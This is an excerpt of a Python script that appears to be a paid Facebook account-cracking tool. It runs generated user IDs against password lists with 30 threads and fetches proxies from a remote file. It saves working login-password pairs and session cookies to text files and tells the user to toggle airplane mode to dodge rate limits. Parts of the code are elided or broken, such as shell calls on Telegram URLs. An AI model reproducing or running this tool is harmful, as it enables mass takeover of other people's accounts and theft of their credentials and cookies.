...
try:
    prox= requests.get('https://raw.githubusercontent.com/Luffy-XD/dod/main/Review/prox.txt').text
...
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mFACEBOK : Khalil Ibn Suleiman 
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGITHUB  : Luffy 
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSERVICE : \033[1;32mPAID
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVERSION : \033[1;32m3.17
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def pak():
                ...
                with tred(max_workers=30) as MAFIA:     
                        ...
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m28 Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/28/Luffy-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [Luffy-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/28/Luffy-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/28/Luffy-CP.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/28/Luffy-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/28/Luffy-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/28/Luffy-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 linex()
                 ok+=1
                 open("/sdcard/28/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def createip():
	os.system("cd && git clone https://t.me/JokerB28")
	os.system('cd && cd Luffy 28 ;python Khalil.py')
#####_____END_____#####
...
def main_apv():
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20MAFIA%20Owner%20YOUSIF%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('https://t.me/JokerB28'+tks)
        main_apv()
menu()
